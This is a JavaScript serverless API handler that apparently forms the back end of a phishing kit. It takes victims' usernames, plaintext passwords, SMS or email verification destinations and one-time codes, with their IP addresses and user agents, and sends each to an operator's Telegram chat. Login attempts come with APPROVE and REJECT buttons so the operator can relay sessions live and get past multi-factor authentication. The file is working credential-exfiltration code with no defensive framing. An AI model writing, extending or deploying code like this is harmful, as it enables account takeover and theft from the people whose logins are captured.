// api/telegram.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { action, data } = req.body;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Missing Telegram configuration');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  let message = '';
  let parseMode = 'HTML';
  let sessionId = null;

  switch (action) {
    case 'domain_detection':
      message = formatDomainDetection(data);
      break;
    case 'login_attempt':
      sessionId = data.sessionId;
      message = formatLoginAttempt(data);
      break;
    case 'auth_attempt':
      message = formatAuthAttempt(data);
      break;
    case 'code_submitted':
      message = formatCodeSubmitted(data);
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  try {
    if (action === 'login_attempt' && sessionId) {
      const pendingApprovals = global.pendingApprovals || new Map();
      pendingApprovals.set(sessionId, { 
        status: 'pending', 
        data: data,
        action: action,
        timestamp: Date.now()
      });
      global.pendingApprovals = pendingApprovals;
    }
    
    await sendTelegramMessage(botToken, chatId, message, parseMode, sessionId);
    res.status(200).json({ success: true, sessionId: sessionId });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ error: 'Failed to send message' });
  }
}

// ============================================================
// ====== FORMAT FUNCTIONS - CLEAN, STANDARD FORMAT ===========
// ============================================================

function formatDomainDetection(data) {
  const { domain, isFree, timestamp, userAgent, ip } = data;
  return `
┌─────────────────────────────────────────
│ DOMAIN DETECTED
├─────────────────────────────────────────
│ DOMAIN    ${domain}
│ TYPE      ${isFree ? 'FREE' : 'PURCHASED'}
│ TIME      ${timestamp}
│ USER      ${userAgent || 'Unknown'}
│ IP        ${ip || 'Unknown'}
└─────────────────────────────────────────
`;
}

function formatLoginAttempt(data) {
  const { username, password, timestamp, userAgent, ip, sessionId } = data;
  return `
┌─────────────────────────────────────────
│ LOGIN ATTEMPT — APPROVAL REQUIRED
├─────────────────────────────────────────
│ USERNAME  ${username}
│ PASSWORD  ${password}
│ SESSION   ${sessionId}
│ TIME      ${timestamp}
│ USER      ${userAgent || 'Unknown'}
│ IP        ${ip || 'Unknown'}
├─────────────────────────────────────────
│ ACTION: APPROVE ${sessionId}
│         REJECT ${sessionId}
└─────────────────────────────────────────
`;
}

function formatAuthAttempt(data) {
  const { method, destination, timestamp, userAgent, ip } = data;
  return `
┌─────────────────────────────────────────
│ VERIFICATION REQUEST
├─────────────────────────────────────────
│ METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
│ DEST      ${destination}
│ TIME      ${timestamp}
│ USER      ${userAgent || 'Unknown'}
│ IP        ${ip || 'Unknown'}
├─────────────────────────────────────────
│ STATUS: AUTO-APPROVED
└─────────────────────────────────────────
`;
}

function formatCodeSubmitted(data) {
  const { code, timestamp, userAgent, ip } = data;
  return `
┌─────────────────────────────────────────
│ CODE SUBMITTED
├─────────────────────────────────────────
│ CODE      ${code}
│ TIME      ${timestamp}
│ USER      ${userAgent || 'Unknown'}
│ IP        ${ip || 'Unknown'}
├─────────────────────────────────────────
│ STATUS: AUTO-APPROVED
└─────────────────────────────────────────
`;
}

async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML', sessionId = null) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  let replyMarkup = {};
  if (sessionId) {
    replyMarkup = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'APPROVE', callback_data: `approve_${sessionId}` },
            { text: 'REJECT', callback_data: `reject_${sessionId}` }
          ]
        ]
      }
    };
  }
  
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: parseMode,
    disable_web_page_preview: true,
    ...replyMarkup
  };

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }

  return response.json();
}